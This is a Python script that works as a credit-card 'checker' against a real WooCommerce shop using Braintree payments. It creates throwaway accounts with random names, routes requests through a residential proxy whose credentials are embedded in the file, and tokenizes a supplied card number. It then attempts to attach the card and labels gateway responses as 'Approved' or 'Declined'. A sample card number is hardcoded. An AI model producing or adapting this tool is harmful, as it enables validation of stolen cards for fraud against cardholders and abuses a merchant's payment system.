import secrets
import uuid
from bs4 import BeautifulSoup
import names
import base64
import random
from requests import Session
from dataclasses import dataclass


@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address.' in response:   return 'Approved! ✅', response 
        elif 'Duplicate card exists in the vault.' in response: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end
    


proxy_url = 'http://a02853eb95a25b1a:RNW78Fm5@res.proxy-seller.com:10000'
class lucky:
    def main(self,card):
        try:
            self.UseMail = BehaviorsBraintree().RandomName('email')
            self.Nombre = BehaviorsBraintree().RandomName('username')
            self.session = Session()
            self.session.proxies.update({
                'http': proxy_url,
                'https': proxy_url
            })
           
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://www.thesweetbasket.com/my-account/', headers=headers)
            self.nonce_registre = BehaviorsBraintree().QueryText(r1.text,'name="woocommerce-register-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.thesweetbasket.com','priority': 'u=0, i','referer': 'https://www.thesweetbasket.com/my-account/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'email': self.UseMail,'tsb_antispam': 'BASKET','wc_order_attribution_source_type': 'typein','wc_order_attribution_referrer': '(none)','wc_order_attribution_utm_campaign': '(none)','wc_order_attribution_utm_source': '(direct)','wc_order_attribution_utm_medium': '(none)','wc_order_attribution_utm_content': '(none)','wc_order_attribution_utm_id': '(none)','wc_order_attribution_utm_term': '(none)','wc_order_attribution_utm_source_platform': '(none)','wc_order_attribution_utm_creative_format': '(none)','wc_order_attribution_utm_marketing_tactic': '(none)','wc_order_attribution_session_entry': 'https://www.thesweetbasket.com/my-account/','wc_order_attribution_session_start_time': '2025-04-07 18:02:37','wc_order_attribution_session_pages': '1','wc_order_attribution_session_count': '1','wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','woocommerce-register-nonce': self.nonce_registre,'_wp_http_referer': '/my-account/','register': 'Register',}
            response = self.session.post('https://www.thesweetbasket.com/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.thesweetbasket.com/my-account/edit-address/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r2 = self.session.get('https://www.thesweetbasket.com/my-account/edit-address/billing/', headers=headers)
            self.edit_address_bill = BehaviorsBraintree().QueryText(r2.text, 'name="woocommerce-edit-address-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.thesweetbasket.com','priority': 'u=0, i','referer': 'https://www.thesweetbasket.com/my-account/edit-address/billing/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'billing_first_name': 'MrSalchichon','billing_last_name': 'GOD','billing_company': '','billing_country': 'US','billing_address_1': 'Times Square, Nueva York, EE. UU.','billing_address_2': '','billing_city': 'Manhattan','billing_state': 'NY','billing_postcode': '10036','billing_phone': '+526466308864','billing_email': self.UseMail,'save_address': 'Save address','woocommerce-edit-address-nonce': self.edit_address_bill,'_wp_http_referer': '/my-account/edit-address/billing/','action': 'edit_address',}
            response = self.session.post('https://www.thesweetbasket.com/my-account/edit-address/billing/', headers=headers, data=data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://www.thesweetbasket.com/my-account/payment-methods/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            r3 = self.session.get('https://www.thesweetbasket.com/my-account/add-payment-method/',  headers=headers)
            wc_braintree_client_token = BehaviorsBraintree().QueryText(r3.text,'var wc_braintree_client_token = ["','"')
            payment_nonce = BehaviorsBraintree().QueryText(r3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {self.token_bear}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],'billingAddress': {'postalCode': '10036','streetAddress': 'Times Square, Nueva York, EE. UU.',},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            r4 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(r4.text,'"token":"','"')
    
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.thesweetbasket.com','priority': 'u=0, i','referer': 'https://www.thesweetbasket.com/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'payment_method': 'braintree_cc','braintree_cc_nonce_key': self.token_card,'braintree_cc_device_data': '{"device_session_id":"546b4440bf7b8bc6c834f3ef18867d04","fraud_merchant_id":null,"correlation_id":"4d62b925-6bf2-428e-8de3-aad26650"}','braintree_cc_3ds_nonce_key': '','braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/4fqxccpjrh8vcdzx/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/4fqxccpjrh8vcdzx"},"merchantId":"4fqxccpjrh8vcdzx","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","American Express"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"The Sweet Basket Company","clientId":"AXlU3QQKUWKY6mwP3HCbcfKiKaHgycaCodeOoduMqqzZOWH4VbRol2BDKLuvBiANPb1fQQuSq77Zyenb","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"thesweetbasketcompanyCAD","payeeEmail":null,"currencyIsoCode":"CAD"}}','woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            pasas = self.session.post('https://www.thesweetbasket.com/my-account/add-payment-method/', headers=headers, data=data,)
            self.session.close()
            if 'Payment method successfully added.' in pasas.text:  return 'Approved! ✅', 'Card Issuer Declined CVV'
            error = BehaviorsBraintree().QueryText(pasas.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            else: return BehaviorsBraintree().ResponseHtml(error[1].split('t method. Reason: ')[1].strip())

        except: return 'Declined! ❌','Declined - Call Issue'

        

if __name__ == '__main__':
    card = '4800126405060713|03|2029|326'
    braintree = lucky()
    result = braintree.main(card)
    print(result)
